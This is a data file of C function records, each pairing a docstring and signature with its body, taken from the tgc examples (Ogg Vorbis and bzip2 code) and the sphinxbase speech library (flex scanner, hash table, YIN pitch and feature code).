{"docstring": "/* from the head of the stream, get the next page.  boundary specifies\n   if the function is allowed to fetch more data from the stream (and\n   how much) or only use internally buffered data.\n\n   boundary: -1) unbounded search\n              0) read no additional data; use cached only\n\t      n) search for a new page beginning for n bytes\n\n   return:   <0) did not find a page (OV_FALSE, OV_EOF, OV_EREAD)\n              n) found a page at absolute offset n */\n", "func_signal": "static ogg_int64_t _get_next_page(OggVorbis_File *vf,ogg_page *og,\n\t\t\t\t  ogg_int64_t boundary)", "code": "{\n  if(boundary>0)boundary+=vf->offset;\n  while(1){\n    long more;\n\n    if(boundary>0 && vf->offset>=boundary)return(OV_FALSE);\n    more=ogg_sync_pageseek(&vf->oy,og);\n    \n    if(more<0){\n      /* skipped n bytes */\n      vf->offset-=more;\n    }else{\n      if(more==0){\n\t/* send more paramedics */\n\tif(!boundary)return(OV_FALSE);\n\t{\n\t  long ret=_get_data(vf);\n\t  if(ret==0)return(OV_EOF);\n\t  if(ret<0)return(OV_EREAD);\n\t}\n      }else{\n\t/* got a page.  Return the offset at the page beginning,\n           advance the internal offset past the page end */\n\togg_int64_t ret=vf->offset;\n\tvf->offset+=more;\n\treturn(ret);\n\t\n      }\n    }\n  }\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/*---------------------------------------------*/\n/* Pre:\n      nblock > 0\n      arr2 exists for [0 .. nblock-1 +N_OVERSHOOT]\n      ((UChar*)arr2)  [0 .. nblock-1] holds block\n      arr1 exists for [0 .. nblock-1]\n\n   Post:\n      ((UChar*)arr2) [0 .. nblock-1] holds block\n      All other areas of block destroyed\n      ftab [ 0 .. 65536 ] destroyed\n      arr1 [0 .. nblock-1] holds sorted order\n*/\n", "func_signal": "void BZ2_blockSort ( EState* s )", "code": "{\n   UInt32* ptr    = s->ptr; \n   UChar*  block  = s->block;\n   UInt32* ftab   = s->ftab;\n   Int32   nblock = s->nblock;\n   Int32   verb   = s->verbosity;\n   Int32   wfact  = s->workFactor;\n   UInt16* quadrant;\n   Int32   budget;\n   Int32   budgetInit;\n   Int32   i;\n\n   if (nblock < 10000) {\n      fallbackSort ( s->arr1, s->arr2, ftab, nblock, verb );\n   } else {\n      /* Calculate the location for quadrant, remembering to get\n         the alignment right.  Assumes that &(block[0]) is at least\n         2-byte aligned -- this should be ok since block is really\n         the first section of arr2.\n      */\n      i = nblock+BZ_N_OVERSHOOT;\n      if (i & 1) i++;\n      quadrant = (UInt16*)(&(block[i]));\n\n      /* (wfact-1) / 3 puts the default-factor-30\n         transition point at very roughly the same place as \n         with v0.1 and v0.9.0.  \n         Not that it particularly matters any more, since the\n         resulting compressed stream is now the same regardless\n         of whether or not we use the main sort or fallback sort.\n      */\n      if (wfact < 1  ) wfact = 1;\n      if (wfact > 100) wfact = 100;\n      budgetInit = nblock * ((wfact-1) / 3);\n      budget = budgetInit;\n\n      mainSort ( ptr, block, quadrant, ftab, nblock, verb, &budget );\n      if (verb >= 3) \n         VPrintf3 ( \"      %d work, %d block, ratio %5.2f\\n\",\n                    budgetInit - budget,\n                    nblock, \n                    (float)(budgetInit - budget) /\n                    (float)(nblock==0 ? 1 : nblock) ); \n      if (budget < 0) {\n         if (verb >= 2) \n            VPrintf0 ( \"    too repetitive; using fallback\"\n                       \" sorting algorithm\\n\" );\n         fallbackSort ( s->arr1, s->arr2, ftab, nblock, verb );\n      }\n   }\n\n   s->origPtr = -1;\n   for (i = 0; i < s->nblock; i++)\n      if (ptr[i] == 0)\n         { s->origPtr = i; break; };\n\n   AssertH( s->origPtr != -1, 1003 );\n}", "path": "tgc/examples/bzip2.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* seek to an offset relative to the *compressed* data. This also\n   scans packets to update the PCM cursor. It will cross a logical\n   bitstream boundary, but only if it can't get any packets out of the\n   tail of the bitstream we seek to (so no surprises).\n\n   returns zero on success, nonzero on failure */\n", "func_signal": "int ov_raw_seek(OggVorbis_File *vf,ogg_int64_t pos)", "code": "{\n  ogg_stream_state work_os;\n\n  if(vf->ready_state<OPENED)return(OV_EINVAL);\n  if(!vf->seekable)\n    return(OV_ENOSEEK); /* don't dump machine if we can't seek */\n\n  if(pos<0 || pos>vf->end)return(OV_EINVAL);\n\n  /* don't yet clear out decoding machine (if it's initialized), in\n     the case we're in the same link.  Restart the decode lapping, and\n     let _fetch_and_process_packet deal with a potential bitstream\n     boundary */\n  vf->pcm_offset=-1;\n  ogg_stream_reset_serialno(&vf->os,\n\t\t\t    vf->current_serialno); /* must set serialno */\n  vorbis_synthesis_restart(&vf->vd);\n    \n  _seek_helper(vf,pos);\n\n  /* we need to make sure the pcm_offset is set, but we don't want to\n     advance the raw cursor past good packets just to get to the first\n     with a granulepos.  That's not equivalent behavior to beginning\n     decoding as immediately after the seek position as possible.\n\n     So, a hack.  We use two stream states; a local scratch state and\n     the shared vf->os stream state.  We use the local state to\n     scan, and the shared state as a buffer for later decode. \n\n     Unfortuantely, on the last page we still advance to last packet\n     because the granulepos on the last page is not necessarily on a\n     packet boundary, and we need to make sure the granpos is\n     correct. \n  */\n\n  {\n    ogg_page og;\n    ogg_packet op;\n    int lastblock=0;\n    int accblock=0;\n    int thisblock;\n    int eosflag;\n\n    ogg_stream_init(&work_os,vf->current_serialno); /* get the memory ready */\n    ogg_stream_reset(&work_os); /* eliminate the spurious OV_HOLE\n                                   return from not necessarily\n                                   starting from the beginning */\n\n    while(1){\n      if(vf->ready_state>=STREAMSET){\n\t/* snarf/scan a packet if we can */\n\tint result=ogg_stream_packetout(&work_os,&op);\n      \n\tif(result>0){\n\n\t  if(vf->vi[vf->current_link].codec_setup){\n\t    thisblock=vorbis_packet_blocksize(vf->vi+vf->current_link,&op);\n\t    if(thisblock<0){\n\t      ogg_stream_packetout(&vf->os,NULL);\n\t      thisblock=0;\n\t    }else{\n\t      \n\t      if(eosflag)\n\t      ogg_stream_packetout(&vf->os,NULL);\n\t      else\n\t\tif(lastblock)accblock+=(lastblock+thisblock)>>2;\n\t    }\t    \n\n\t    if(op.granulepos!=-1){\n\t      int i,link=vf->current_link;\n\t      ogg_int64_t granulepos=op.granulepos-vf->pcmlengths[link*2];\n\t      if(granulepos<0)granulepos=0;\n\t      \n\t      for(i=0;i<link;i++)\n\t\tgranulepos+=vf->pcmlengths[i*2+1];\n\t      vf->pcm_offset=granulepos-accblock;\n\t      break;\n\t    }\n\t    lastblock=thisblock;\n\t    continue;\n\t  }else\n\t    ogg_stream_packetout(&vf->os,NULL);\n\t}\n      }\n      \n      if(!lastblock){\n\tif(_get_next_page(vf,&og,-1)<0){\n\t  vf->pcm_offset=ov_pcm_total(vf,-1);\n\t  break;\n\t}\n      }else{\n\t/* huh?  Bogus stream with packets but no granulepos */\n\tvf->pcm_offset=-1;\n\tbreak;\n      }\n      \n      /* has our decoding just traversed a bitstream boundary? */\n      if(vf->ready_state>=STREAMSET)\n\tif(vf->current_serialno!=ogg_page_serialno(&og)){\n\t  _decode_clear(vf); /* clear out stream state */\n\t  ogg_stream_clear(&work_os);\n\t}\n\n      if(vf->ready_state<STREAMSET){\n\tint link;\n\t\n\tvf->current_serialno=ogg_page_serialno(&og);\n\tfor(link=0;link<vf->links;link++)\n\t  if(vf->serialnos[link]==vf->current_serialno)break;\n\tif(link==vf->links)goto seek_error; /* sign of a bogus stream.\n\t\t\t\t\t       error out, leave\n\t\t\t\t\t       machine uninitialized */\n\tvf->current_link=link;\n\t\n\togg_stream_reset_serialno(&vf->os,vf->current_serialno);\n\togg_stream_reset_serialno(&work_os,vf->current_serialno); \n\tvf->ready_state=STREAMSET;\n\t\n      }\n    \n      ogg_stream_pagein(&vf->os,&og);\n      ogg_stream_pagein(&work_os,&og);\n      eosflag=ogg_page_eos(&og);\n    }\n  }\n\n  ogg_stream_clear(&work_os);\n  vf->bittrack=0.f;\n  vf->samptrack=0.f;\n  return(0);\n\n seek_error:\n  /* dump the machine so we're in a known state */\n  vf->pcm_offset=-1;\n  ogg_stream_clear(&work_os);\n  _decode_clear(vf);\n  return OV_EBADLINK;\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* add the incoming page to the stream state; we decompose the page\n   into packet segments here as well. */\n", "func_signal": "int ogg_stream_pagein(ogg_stream_state *os, ogg_page *og)", "code": "{\n  unsigned char *header=og->header;\n  unsigned char *body=og->body;\n  long           bodysize=og->body_len;\n  int            segptr=0;\n\n  int version=ogg_page_version(og);\n  int continued=ogg_page_continued(og);\n  int bos=ogg_page_bos(og);\n  int eos=ogg_page_eos(og);\n  ogg_int64_t granulepos=ogg_page_granulepos(og);\n  int serialno=ogg_page_serialno(og);\n  long pageno=ogg_page_pageno(og);\n  int segments=header[26];\n  \n  /* clean up 'returned data' */\n  {\n    long lr=os->lacing_returned;\n    long br=os->body_returned;\n\n    /* body data */\n    if(br){\n      os->body_fill-=br;\n      if(os->body_fill)\n\tmemmove(os->body_data,os->body_data+br,os->body_fill);\n      os->body_returned=0;\n    }\n\n    if(lr){\n      /* segment table */\n      if(os->lacing_fill-lr){\n\tmemmove(os->lacing_vals,os->lacing_vals+lr,\n\t\t(os->lacing_fill-lr)*sizeof(*os->lacing_vals));\n\tmemmove(os->granule_vals,os->granule_vals+lr,\n\t\t(os->lacing_fill-lr)*sizeof(*os->granule_vals));\n      }\n      os->lacing_fill-=lr;\n      os->lacing_packet-=lr;\n      os->lacing_returned=0;\n    }\n  }\n\n  /* check the serial number */\n  if(serialno!=os->serialno)return(-1);\n  if(version>0)return(-1);\n\n  _os_lacing_expand(os,segments+1);\n\n  /* are we in sequence? */\n  if(pageno!=os->pageno){\n    int i;\n\n    /* unroll previous partial packet (if any) */\n    for(i=os->lacing_packet;i<os->lacing_fill;i++)\n      os->body_fill-=os->lacing_vals[i]&0xff;\n    os->lacing_fill=os->lacing_packet;\n\n    /* make a note of dropped data in segment table */\n    if(os->pageno!=-1){\n      os->lacing_vals[os->lacing_fill++]=0x400;\n      os->lacing_packet++;\n    }\n\n    /* are we a 'continued packet' page?  If so, we'll need to skip\n       some segments */\n    if(continued){\n      bos=0;\n      for(;segptr<segments;segptr++){\n\tint val=header[27+segptr];\n\tbody+=val;\n\tbodysize-=val;\n\tif(val<255){\n\t  segptr++;\n\t  break;\n\t}\n      }\n    }\n  }\n  \n  if(bodysize){\n    _os_body_expand(os,bodysize);\n    memcpy(os->body_data+os->body_fill,body,bodysize);\n    os->body_fill+=bodysize;\n  }\n\n  {\n    int saved=-1;\n    while(segptr<segments){\n      int val=header[27+segptr];\n      os->lacing_vals[os->lacing_fill]=val;\n      os->granule_vals[os->lacing_fill]=-1;\n      \n      if(bos){\n\tos->lacing_vals[os->lacing_fill]|=0x100;\n\tbos=0;\n      }\n      \n      if(val<255)saved=os->lacing_fill;\n      \n      os->lacing_fill++;\n      segptr++;\n      \n      if(val<255)os->lacing_packet=os->lacing_fill;\n    }\n  \n    /* set the granulepos on the last granuleval of the last full packet */\n    if(saved!=-1){\n      os->granule_vals[saved]=granulepos;\n    }\n\n  }\n\n  if(eos){\n    os->e_o_s=1;\n    if(os->lacing_fill>0)\n      os->lacing_vals[os->lacing_fill-1]|=0x200;\n  }\n\n  os->pageno=pageno+1;\n\n  return(0);\n}", "path": "tgc/examples/oggenc.c", "commit_date": "2016-04-19 00:00:00", "repo_name": "orangeduck/tgc", "stars": 910, "license": "other", "language": "c", "size": 36941}
{"docstring": "/* Insert -hmmdump, -lm, -svq4svq, -beam, -lminmemory into a hash and display it. */\n", "func_signal": "int\nmain(int argc, char **argv)", "code": "{\n    hash_table_t *ht;\n    ht = hash_table_new(75, 0);\n\n    if (hash_table_enter(ht, \"-hmmdump\", (void *)1) != (void *)1) {\n        E_FATAL(\"Insertion of -hmmdump failed\\n\");\n    }\n\n    if (hash_table_enter(ht, \"-svq4svq\", (void *)1) != (void *)1) {\n        E_FATAL(\"Insertion of -svq4svq failed\\n\");\n    }\n\n    if (hash_table_enter(ht, \"-lm\", (void *)1) != (void *)1) {\n        E_FATAL(\"Insertion of -lm failed\\n\");\n    }\n\n    if (hash_table_enter(ht, \"-beam\", (void *)1) != (void *)1) {\n        E_FATAL(\"Insertion of -beam failed\\n\");\n    }\n\n    if (hash_table_enter(ht, \"-lminmemory\", (void *)1) != (void *)1) {\n        E_FATAL(\"Insertion of -lminmemory failed\\n\");\n    }\n\n    hash_table_display(ht, 1);\n\n    hash_table_free(ht);\n    ht = NULL;\n    return 0;\n}", "path": "sphinxbase/test/unit/test_hash/displayhash.c", "commit_date": "2006-10-10 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/** Pushes the new state onto the stack. The new state becomes\n *  the current state. This function will allocate the stack\n *  if necessary.\n *  @param new_buffer The new state.\n *  @param yyscanner The scanner object.\n */\n", "func_signal": "void yypush_buffer_state (YY_BUFFER_STATE new_buffer , yyscan_t yyscanner)", "code": "{\n    struct yyguts_t * yyg = (struct yyguts_t*)yyscanner;\n\tif (new_buffer == NULL)\n\t\treturn;\n\n\tyyensure_buffer_stack(yyscanner);\n\n\t/* This block is copied from yy_switch_to_buffer. */\n\tif ( YY_CURRENT_BUFFER )\n\t\t{\n\t\t/* Flush out information for old buffer. */\n\t\t*yyg->yy_c_buf_p = yyg->yy_hold_char;\n\t\tYY_CURRENT_BUFFER_LVALUE->yy_buf_pos = yyg->yy_c_buf_p;\n\t\tYY_CURRENT_BUFFER_LVALUE->yy_n_chars = yyg->yy_n_chars;\n\t\t}\n\n\t/* Only push if top exists. Otherwise, replace top. */\n\tif (YY_CURRENT_BUFFER)\n\t\tyyg->yy_buffer_stack_top++;\n\tYY_CURRENT_BUFFER_LVALUE = new_buffer;\n\n\t/* copied from yy_switch_to_buffer. */\n\tyy_load_buffer_state(yyscanner );\n\tyyg->yy_did_buffer_switch_on_eof = 1;\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/* yy_try_NUL_trans - try to make a transition on the NUL character\n *\n * synopsis\n *\tnext_state = yy_try_NUL_trans( current_state );\n */\n", "func_signal": "static yy_state_type yy_try_NUL_trans  (yy_state_type yy_current_state , yyscan_t yyscanner)", "code": "{\n\tint yy_is_jam;\n    struct yyguts_t * yyg = (struct yyguts_t*)yyscanner; /* This var may be unused depending upon options. */\n\tchar *yy_cp = yyg->yy_c_buf_p;\n\n\tYY_CHAR yy_c = 1;\n\tif ( yy_accept[yy_current_state] )\n\t\t{\n\t\tyyg->yy_last_accepting_state = yy_current_state;\n\t\tyyg->yy_last_accepting_cpos = yy_cp;\n\t\t}\n\twhile ( yy_chk[yy_base[yy_current_state] + yy_c] != yy_current_state )\n\t\t{\n\t\tyy_current_state = (int) yy_def[yy_current_state];\n\t\tif ( yy_current_state >= 98 )\n\t\t\tyy_c = yy_meta[(unsigned int) yy_c];\n\t\t}\n\tyy_current_state = yy_nxt[yy_base[yy_current_state] + (flex_int16_t) yy_c];\n\tyy_is_jam = (yy_current_state == 97);\n\n\t(void)yyg;\n\treturn yy_is_jam ? 0 : yy_current_state;\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/** Destroy the buffer.\n * @param b a buffer created with yy_create_buffer()\n * @param yyscanner The scanner object.\n */\n", "func_signal": "void yy_delete_buffer (YY_BUFFER_STATE  b , yyscan_t yyscanner)", "code": "{\n    struct yyguts_t * yyg = (struct yyguts_t*)yyscanner;\n\n\tif ( ! b )\n\t\treturn;\n\n\tif ( b == YY_CURRENT_BUFFER ) /* Not sure if we should pop here. */\n\t\tYY_CURRENT_BUFFER_LVALUE = (YY_BUFFER_STATE) 0;\n\n\tif ( b->yy_is_our_buffer )\n\t\tyyfree((void *) b->yy_ch_buf ,yyscanner );\n\n\tyyfree((void *) b ,yyscanner );\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/** Setup the input buffer state to scan the given bytes. The next call to yylex() will\n * scan from a @e copy of @a bytes.\n * @param yybytes the byte buffer to scan\n * @param _yybytes_len the number of bytes in the buffer pointed to by @a bytes.\n * @param yyscanner The scanner object.\n * @return the newly allocated buffer state object.\n */\n", "func_signal": "YY_BUFFER_STATE yy_scan_bytes  (yyconst char * yybytes, int  _yybytes_len , yyscan_t yyscanner)", "code": "{\n\tYY_BUFFER_STATE b;\n\tchar *buf;\n\tyy_size_t n;\n\tyy_size_t i;\n    \n\t/* Get memory for full buffer, including space for trailing EOB's. */\n\tn = (yy_size_t) _yybytes_len + 2;\n\tbuf = (char *) yyalloc(n ,yyscanner );\n\tif ( ! buf )\n\t\tYY_FATAL_ERROR( \"out of dynamic memory in yy_scan_bytes()\" );\n\n\tfor ( i = 0; i < _yybytes_len; ++i )\n\t\tbuf[i] = yybytes[i];\n\n\tbuf[_yybytes_len] = buf[_yybytes_len+1] = YY_END_OF_BUFFER_CHAR;\n\n\tb = yy_scan_buffer(buf,n ,yyscanner);\n\tif ( ! b )\n\t\tYY_FATAL_ERROR( \"bad buffer in yy_scan_bytes()\" );\n\n\t/* It's okay to grow etc. this buffer, and we should throw it\n\t * away when we're done.\n\t */\n\tb->yy_is_our_buffer = 1;\n\n\treturn b;\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/** Set the current column.\n * @param _column_no column number\n * @param yyscanner The scanner object.\n */\n", "func_signal": "void yyset_column (int  _column_no , yyscan_t yyscanner)", "code": "{\n    struct yyguts_t * yyg = (struct yyguts_t*)yyscanner;\n\n        /* column is only valid if an input buffer exists. */\n        if (! YY_CURRENT_BUFFER )\n           YY_FATAL_ERROR( \"yyset_column called with no buffer\" );\n    \n    yycolumn = _column_no;\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/** Setup the input buffer state to scan directly from a user-specified character buffer.\n * @param base the character buffer\n * @param size the size in bytes of the character buffer\n * @param yyscanner The scanner object.\n * @return the newly allocated buffer state object. \n */\n", "func_signal": "YY_BUFFER_STATE yy_scan_buffer  (char * base, yy_size_t  size , yyscan_t yyscanner)", "code": "{\n\tYY_BUFFER_STATE b;\n    \n\tif ( size < 2 ||\n\t     base[size-2] != YY_END_OF_BUFFER_CHAR ||\n\t     base[size-1] != YY_END_OF_BUFFER_CHAR )\n\t\t/* They forgot to leave room for the EOB's. */\n\t\treturn NULL;\n\n\tb = (YY_BUFFER_STATE) yyalloc(sizeof( struct yy_buffer_state ) ,yyscanner );\n\tif ( ! b )\n\t\tYY_FATAL_ERROR( \"out of dynamic memory in yy_scan_buffer()\" );\n\n\tb->yy_buf_size = size - 2;\t/* \"- 2\" to take care of EOB's */\n\tb->yy_buf_pos = b->yy_ch_buf = base;\n\tb->yy_is_our_buffer = 0;\n\tb->yy_input_file = NULL;\n\tb->yy_n_chars = b->yy_buf_size;\n\tb->yy_is_interactive = 0;\n\tb->yy_at_bol = 1;\n\tb->yy_fill_buffer = 0;\n\tb->yy_buffer_status = YY_BUFFER_NEW;\n\n\tyy_switch_to_buffer(b ,yyscanner );\n\n\treturn b;\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/** Discard all buffered characters. On the next scan, YY_INPUT will be called.\n * @param b the buffer state to be flushed, usually @c YY_CURRENT_BUFFER.\n * @param yyscanner The scanner object.\n */\n", "func_signal": "void yy_flush_buffer (YY_BUFFER_STATE  b , yyscan_t yyscanner)", "code": "{\n    struct yyguts_t * yyg = (struct yyguts_t*)yyscanner;\n\tif ( ! b )\n\t\treturn;\n\n\tb->yy_n_chars = 0;\n\n\t/* We always need two end-of-buffer characters.  The first causes\n\t * a transition to the end-of-buffer state.  The second causes\n\t * a jam in that state.\n\t */\n\tb->yy_ch_buf[0] = YY_END_OF_BUFFER_CHAR;\n\tb->yy_ch_buf[1] = YY_END_OF_BUFFER_CHAR;\n\n\tb->yy_buf_pos = &b->yy_ch_buf[0];\n\n\tb->yy_at_bol = 1;\n\tb->yy_buffer_status = YY_BUFFER_NEW;\n\n\tif ( b == YY_CURRENT_BUFFER )\n\t\tyy_load_buffer_state(yyscanner );\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/** Set the current line number.\n * @param _line_number line number\n * @param yyscanner The scanner object.\n */\n", "func_signal": "void yyset_lineno (int  _line_number , yyscan_t yyscanner)", "code": "{\n    struct yyguts_t * yyg = (struct yyguts_t*)yyscanner;\n\n        /* lineno is only valid if an input buffer exists. */\n        if (! YY_CURRENT_BUFFER )\n           YY_FATAL_ERROR( \"yyset_lineno called with no buffer\" );\n    \n    yylineno = _line_number;\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/**\n * The core of YIN: cumulative mean normalized difference function.\n */\n", "func_signal": "static void\ncmn_diff(int16 const *signal, int32 *out_diff, int ndiff)", "code": "{\n    uint32 cum, cshift;\n    int32 t, tscale;\n\n    out_diff[0] = 32768;\n    cum = 0;\n    cshift = 0;\n\n    /* Determine how many bits we can scale t up by below. */\n    for (tscale = 0; tscale < 32; ++tscale)\n        if (ndiff & (1<<(31-tscale)))\n            break;\n    --tscale; /* Avoid teh overflowz. */\n    /* printf(\"tscale is %d (ndiff - 1) << tscale is %d\\n\",\n       tscale, (ndiff-1) << tscale); */\n\n    /* Somewhat elaborate block floating point implementation.\n     * The fp implementation of this is really a lot simpler. */\n    for (t = 1; t < ndiff; ++t) {\n        uint32 dd, dshift, norm;\n        int j;\n\n        dd = 0;\n        dshift = 0;\n        for (j = 0; j < ndiff; ++j) {\n            int diff = signal[j] - signal[t + j];\n            /* Guard against overflows. */\n            if (dd > (1UL<<tscale)) {\n                dd >>= 1;\n                ++dshift;\n            }\n            dd += (diff * diff) >> dshift;\n        }\n        /* Make sure the diffs and cum are shifted to the same\n         * scaling factor (usually dshift will be zero) */\n        if (dshift > cshift) {\n            cum += dd << (dshift-cshift);\n        }\n        else {\n            cum += dd >> (cshift-dshift);\n        }\n\n        /* Guard against overflows and also ensure that (t<<tscale) > cum. */\n        while (cum > (1UL<<tscale)) {\n            cum >>= 1;\n            ++cshift;\n        }\n        /* Avoid divide-by-zero! */\n        if (cum == 0) cum = 1;\n        /* Calculate the normalizer in high precision. */\n        norm = (t << tscale) / cum;\n        /* Do a long multiply and shift down to Q15. */\n        out_diff[t] = (int32)(((long long)dd * norm)\n                              >> (tscale - 15 + cshift - dshift));\n        /* printf(\"dd %d cshift %d dshift %d scaledt %d cum %d norm %d cmn %d\\n\",\n           dd, cshift, dshift, (t<<tscale), cum, norm, out_diff[t]); */\n    }\n}", "path": "sphinxbase/src/libsphinxbase/fe/yin.c", "commit_date": "2016-07-17 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/**\n * Project feature components to subvectors (if any).\n */\n", "func_signal": "static void\nfeat_subvec_project(feat_t *fcb, mfcc_t ***inout_feat, uint32 nfr)", "code": "{\n    uint32 i;\n\n    if (fcb->subvecs == NULL)\n        return;\n    for (i = 0; i < nfr; ++i) {\n        mfcc_t *out;\n        int32 j;\n\n        out = fcb->sv_buf;\n        for (j = 0; j < fcb->n_sv; ++j) {\n            int32 *d;\n            for (d = fcb->subvecs[j]; d && *d != -1; ++d) {\n                *out++ = inout_feat[i][0][*d];\n            }\n        }\n        memcpy(inout_feat[i][0], fcb->sv_buf, fcb->sv_dim * sizeof(*fcb->sv_buf));\n    }\n}", "path": "sphinxbase/src/libsphinxbase/feat/feat.c", "commit_date": "2016-05-30 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/**\n * This function returns a very large prime. \n */\n", "func_signal": "static int32\nprime_size(int32 size)", "code": "{\n    int32 i;\n\n    for (i = 0; (prime[i] > 0) && (prime[i] < size); i++);\n    if (prime[i] <= 0) {\n        E_WARN(\"Very large hash table requested (%d entries)\\n\", size);\n        --i;\n    }\n    return (prime[i]);\n}", "path": "sphinxbase/src/libsphinxbase/util/hash_table.c", "commit_date": "2016-07-17 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/* Allocates the stack if it does not exist.\n *  Guarantees space for at least one push.\n */\n", "func_signal": "static void yyensure_buffer_stack (yyscan_t yyscanner)", "code": "{\n\tint num_to_alloc;\n    struct yyguts_t * yyg = (struct yyguts_t*)yyscanner;\n\n\tif (!yyg->yy_buffer_stack) {\n\n\t\t/* First allocation is just for 2 elements, since we don't know if this\n\t\t * scanner will even need a stack. We use 2 instead of 1 to avoid an\n\t\t * immediate realloc on the next call.\n         */\n      num_to_alloc = 1; /* After all that talk, this was set to 1 anyways... */\n\t\tyyg->yy_buffer_stack = (struct yy_buffer_state**)yyalloc\n\t\t\t\t\t\t\t\t(num_to_alloc * sizeof(struct yy_buffer_state*)\n\t\t\t\t\t\t\t\t, yyscanner);\n\t\tif ( ! yyg->yy_buffer_stack )\n\t\t\tYY_FATAL_ERROR( \"out of dynamic memory in yyensure_buffer_stack()\" );\n\t\t\t\t\t\t\t\t  \n\t\tmemset(yyg->yy_buffer_stack, 0, num_to_alloc * sizeof(struct yy_buffer_state*));\n\t\t\t\t\n\t\tyyg->yy_buffer_stack_max = num_to_alloc;\n\t\tyyg->yy_buffer_stack_top = 0;\n\t\treturn;\n\t}\n\n\tif (yyg->yy_buffer_stack_top >= (yyg->yy_buffer_stack_max) - 1){\n\n\t\t/* Increase the buffer to prepare for a possible push. */\n\t\tyy_size_t grow_size = 8 /* arbitrary grow size */;\n\n\t\tnum_to_alloc = yyg->yy_buffer_stack_max + grow_size;\n\t\tyyg->yy_buffer_stack = (struct yy_buffer_state**)yyrealloc\n\t\t\t\t\t\t\t\t(yyg->yy_buffer_stack,\n\t\t\t\t\t\t\t\tnum_to_alloc * sizeof(struct yy_buffer_state*)\n\t\t\t\t\t\t\t\t, yyscanner);\n\t\tif ( ! yyg->yy_buffer_stack )\n\t\t\tYY_FATAL_ERROR( \"out of dynamic memory in yyensure_buffer_stack()\" );\n\n\t\t/* zero only the new slots.*/\n\t\tmemset(yyg->yy_buffer_stack + yyg->yy_buffer_stack_max, 0, grow_size * sizeof(struct yy_buffer_state*));\n\t\tyyg->yy_buffer_stack_max = num_to_alloc;\n\t}\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf_scanner.c", "commit_date": "2016-09-24 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
{"docstring": "/* Extract as rulename everything after the secondlast dot, if existent. \n * Because everything before the secondlast dot is the path-specification. */\n", "func_signal": "static char *\nimportname2rulename(char *importname)", "code": "{\n    char *rulename = ckd_salloc(importname);\n    char *last_dotpos;\n    char *secondlast_dotpos;\n\n    if ((last_dotpos = strrchr(rulename + 1, '.')) != NULL) {\n        *last_dotpos = '\\0';\n        if ((secondlast_dotpos = strrchr(rulename + 1, '.')) != NULL) {\n            *last_dotpos = '.';\n            *secondlast_dotpos = '<';\n            secondlast_dotpos = ckd_salloc(secondlast_dotpos);\n            ckd_free(rulename);\n            return secondlast_dotpos;\n        }\n        else {\n            *last_dotpos = '.';\n            return rulename;\n        }\n    }\n    else {\n        return rulename;\n    }\n}", "path": "sphinxbase/src/libsphinxbase/lm/jsgf.c", "commit_date": "2018-02-10 00:00:00", "repo_name": "cmusphinx/sphinxbase", "stars": 529, "license": "other", "language": "c", "size": 9202}
